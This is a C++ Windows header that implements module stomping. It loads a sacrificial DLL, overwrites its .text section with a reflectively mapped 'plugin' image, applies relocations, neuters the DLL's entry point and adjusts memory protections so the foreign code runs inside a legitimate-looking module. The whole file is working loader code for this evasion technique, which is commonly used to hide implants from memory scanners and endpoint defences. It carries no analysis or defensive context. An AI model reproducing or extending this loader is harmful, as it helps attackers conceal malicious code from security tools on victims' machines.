#pragma once
#include <Windows.h>
#include <cstdio>
#include <cstdint>
#include <cstring>
#include "ReflectiveLoaderEngine.h"

#ifdef NDEBUG
#define SDBG(...) ((void)0)
#else
#define SDBG(fmt, ...) do { fprintf(stderr, "[STOMP] " fmt "\n", ##__VA_ARGS__); fflush(stderr); } while(0)
#endif

struct StompedModule {
    void*    stompedBase;
    void*    privateBase;
    HMODULE  hSacrificial;
    uint8_t* originalBytes;
    SIZE_T   originalSize;
    DWORD    originalProt;
    char     sacrificialPath[MAX_PATH];

    StompedModule() : stompedBase(nullptr), privateBase(nullptr), hSacrificial(nullptr),
                      originalBytes(nullptr), originalSize(0), originalProt(0) {
        sacrificialPath[0] = '\0';
    }
};

static IMAGE_SECTION_HEADER* FindSection(void* base, const char* name) {
    auto dos = (PIMAGE_DOS_HEADER)base;
    auto nt  = (PIMAGE_NT_HEADERS)((uint8_t*)base + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (int i = 0; i < nt->FileHeader.NumberOfSections; ++i, ++sec)
        if (strncmp((const char*)sec->Name, name, IMAGE_SIZEOF_SHORT_NAME) == 0)
            return sec;
    return nullptr;
}

static SIZE_T GetSectionVirtualSize(IMAGE_SECTION_HEADER* sec) {
    return sec->Misc.VirtualSize ? sec->Misc.VirtualSize : sec->SizeOfRawData;
}

static DWORD SectionCharsToProtection(DWORD ch) {
    bool r = (ch & IMAGE_SCN_MEM_READ)    != 0;
    bool w = (ch & IMAGE_SCN_MEM_WRITE)   != 0;
    bool x = (ch & IMAGE_SCN_MEM_EXECUTE) != 0;
    if (x && w) return PAGE_EXECUTE_READWRITE;
    if (x && r) return PAGE_EXECUTE_READ;
    if (x)      return PAGE_EXECUTE;
    if (r && w) return PAGE_READWRITE;
    return PAGE_READONLY;
}

static void* GetStompedExport(const StompedModule& mod, const char* name) {
    if (!mod.privateBase) return nullptr;
    void* privateAddr = GetExport(MemModule(mod.privateBase), name);
    if (!privateAddr) return nullptr;
    uintptr_t rva = (uintptr_t)privateAddr - (uintptr_t)mod.privateBase;
    return (void*)((uintptr_t)mod.stompedBase + rva);
}

static void FreePrivateMapping(StompedModule& mod,
                               const WinApiTable& api = DefaultWinApiTable()) {
    if (mod.privateBase) {
        SDBG("Freeing private mapping at %p", mod.privateBase);
        api.VirtualFree(mod.privateBase, 0, MEM_RELEASE);
        mod.privateBase = nullptr;
    }
}

// ---------------------------------------------------------------------------
// StompModule: load a sacrificial DLL, overwrite its .text with the plugin
// image, apply per-section protections (never RWX), and patch the entry point.
// ---------------------------------------------------------------------------
static StompedModule StompModule(const uint8_t* pluginDll, size_t pluginSize,
                                 const char* sacrificialDllName,
                                 const WinApiTable& api = DefaultWinApiTable()) {
    StompedModule out;

    SDBG("MapImage (plugin, %zu bytes)", pluginSize);
    MemModule priv = MapImage(pluginDll, pluginSize, api);
    if (!priv.base) { SDBG("MapImage failed"); return out; }

    auto privDos = (PIMAGE_DOS_HEADER)priv.base;
    auto privNt  = (PIMAGE_NT_HEADERS)((uint8_t*)priv.base + privDos->e_lfanew);
    SIZE_T pluginImageSize = privNt->OptionalHeader.SizeOfImage;

    SDBG("LoadLibraryA(\"%s\")", sacrificialDllName);
    HMODULE hVictim = api.LoadLibraryA(sacrificialDllName);
    if (!hVictim) {
        SDBG("LoadLibraryA failed (error %lu)", GetLastError());
        api.VirtualFree(priv.base, 0, MEM_RELEASE);
        return out;
    }

    api.GetModuleFileNameA(hVictim, out.sacrificialPath, MAX_PATH);

    auto victimText = FindSection(hVictim, ".text");
    if (!victimText) {
        SDBG("No .text section in sacrificial");
        api.FreeLibrary(hVictim); api.VirtualFree(priv.base, 0, MEM_RELEASE);
        return out;
    }

    SIZE_T victimTextSize = GetSectionVirtualSize(victimText);
    SDBG("victim .text=0x%llx, plugin image=0x%llx",
         (unsigned long long)victimTextSize, (unsigned long long)pluginImageSize);

    if (pluginImageSize > victimTextSize) {
        SDBG("Plugin image larger than victim .text");
        api.FreeLibrary(hVictim); api.VirtualFree(priv.base, 0, MEM_RELEASE);
        return out;
    }

    uint8_t* victimBase = (uint8_t*)hVictim;
    uint8_t* stompAddr  = victimBase + victimText->VirtualAddress;

    out.originalBytes = (uint8_t*)api.HeapAlloc(api.GetProcessHeap(), 0, victimTextSize);
    if (!out.originalBytes) {
        api.FreeLibrary(hVictim); api.VirtualFree(priv.base, 0, MEM_RELEASE);
        return out;
    }

    MEMORY_BASIC_INFORMATION mbi;
    api.VirtualQuery(stompAddr, &mbi, sizeof(mbi));
    out.originalProt = mbi.Protect;
    out.originalSize = victimTextSize;

    DWORD oldProt;
    if (!api.VirtualProtect(stompAddr, victimTextSize, PAGE_READWRITE, &oldProt)) {
        api.HeapFree(api.GetProcessHeap(), 0, out.originalBytes);
        out.originalBytes = nullptr;
        api.FreeLibrary(hVictim); api.VirtualFree(priv.base, 0, MEM_RELEASE);
        return out;
    }

    memcpy(out.originalBytes, stompAddr, victimTextSize);

    memset(stompAddr, 0, victimTextSize);
    memcpy(stompAddr, priv.base, pluginImageSize);

    auto& relocDir = privNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
    if (relocDir.Size && relocDir.VirtualAddress) {
        DWORD_PTR delta = (DWORD_PTR)stompAddr - (DWORD_PTR)priv.base;
        auto reloc = (PIMAGE_BASE_RELOCATION)(stompAddr + relocDir.VirtualAddress);
        auto end   = (uint8_t*)reloc + relocDir.Size;

        while ((uint8_t*)reloc < end && reloc->SizeOfBlock) {
            size_t count = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
            auto list = (WORD*)(reloc + 1);
            for (size_t i = 0; i < count; ++i) {
                WORD type = list[i] >> 12;
                WORD off  = list[i] & 0x0FFF;
#ifdef _WIN64
                if (type == IMAGE_REL_BASED_DIR64)
#else
                if (type == IMAGE_REL_BASED_HIGHLOW)
#endif
                {
                    auto* p = (ULONG_PTR*)(stompAddr + reloc->VirtualAddress + off);
                    *p += delta;
                }
            }
            reloc = (PIMAGE_BASE_RELOCATION)((uint8_t*)reloc + reloc->SizeOfBlock);
        }
    }

    auto victimNt = (PIMAGE_NT_HEADERS)(victimBase + ((PIMAGE_DOS_HEADER)victimBase)->e_lfanew);
    DWORD epRva = victimNt->OptionalHeader.AddressOfEntryPoint;
    if (epRva) {
        uint8_t* epAddr  = victimBase + epRva;
        bool epInText = (epAddr >= stompAddr && epAddr < stompAddr + victimTextSize);
        if (!epInText) { DWORD tmp; api.VirtualProtect(epAddr, 16, PAGE_READWRITE, &tmp); }
        epAddr[0] = 0xB8; epAddr[1] = 0x01; epAddr[2] = 0x00;
        epAddr[3] = 0x00; epAddr[4] = 0x00; epAddr[5] = 0xC3;
        if (!epInText) { DWORD tmp; api.VirtualProtect(epAddr, 16, PAGE_EXECUTE_READ, &tmp); }
    }

    auto firstSec = IMAGE_FIRST_SECTION(privNt);
    if (firstSec->VirtualAddress > 0) {
        DWORD tmp;
        api.VirtualProtect(stompAddr, firstSec->VirtualAddress, PAGE_READONLY, &tmp);
    }

    auto pluginSec = IMAGE_FIRST_SECTION(privNt);
    for (int i = 0; i < privNt->FileHeader.NumberOfSections; ++i, ++pluginSec) {
        SIZE_T secSize = pluginSec->Misc.VirtualSize
                       ? pluginSec->Misc.VirtualSize : pluginSec->SizeOfRawData;
        if (secSize == 0) continue;
        DWORD tmp;
        api.VirtualProtect(stompAddr + pluginSec->VirtualAddress, secSize,
                       SectionCharsToProtection(pluginSec->Characteristics), &tmp);
    }

    if (pluginImageSize < victimTextSize) {
        uintptr_t tailStart = ((uintptr_t)(stompAddr + pluginImageSize) + 0xFFF) & ~(uintptr_t)0xFFF;
        uintptr_t tailEnd   = (uintptr_t)(stompAddr + victimTextSize);
        if (tailStart < tailEnd) {
            DWORD tmp;
            api.VirtualProtect((void*)tailStart, tailEnd - tailStart, PAGE_READONLY, &tmp);
        }
    }

    if (epRva) {
        uint8_t* epAddr = victimBase + epRva;
        MEMORY_BASIC_INFORMATION epMbi;
        api.VirtualQuery(epAddr, &epMbi, sizeof(epMbi));
        if (!(epMbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ |
              PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY))) {
            DWORD tmp;
            api.VirtualProtect(epAddr, 6, PAGE_EXECUTE_READ, &tmp);
        }
    }

    out.stompedBase  = stompAddr;
    out.privateBase  = priv.base;
    out.hSacrificial = hVictim;
    return out;
}

// ---------------------------------------------------------------------------
// Full cleanup: restore original bytes, unload the stomped module, reload it
// clean from disk.
// ---------------------------------------------------------------------------
static void FreeStompedModule(StompedModule& mod,
                              const WinApiTable& api = DefaultWinApiTable()) {
    if (mod.stompedBase && mod.originalBytes) {
        DWORD old;
        api.VirtualProtect(mod.stompedBase, mod.originalSize, PAGE_READWRITE, &old);
        memcpy(mod.stompedBase, mod.originalBytes, mod.originalSize);
        api.VirtualProtect(mod.stompedBase, mod.originalSize, mod.originalProt, &old);
    }

    if (mod.hSacrificial) {
        api.FreeLibrary(mod.hSacrificial);
        if (mod.sacrificialPath[0])
            api.LoadLibraryA(mod.sacrificialPath);
    }

    if (mod.originalBytes) {
        memset(mod.originalBytes, 0, mod.originalSize);
        api.HeapFree(api.GetProcessHeap(), 0, mod.originalBytes);
    }

    FreePrivateMapping(mod, api);
    mod = StompedModule{};
}
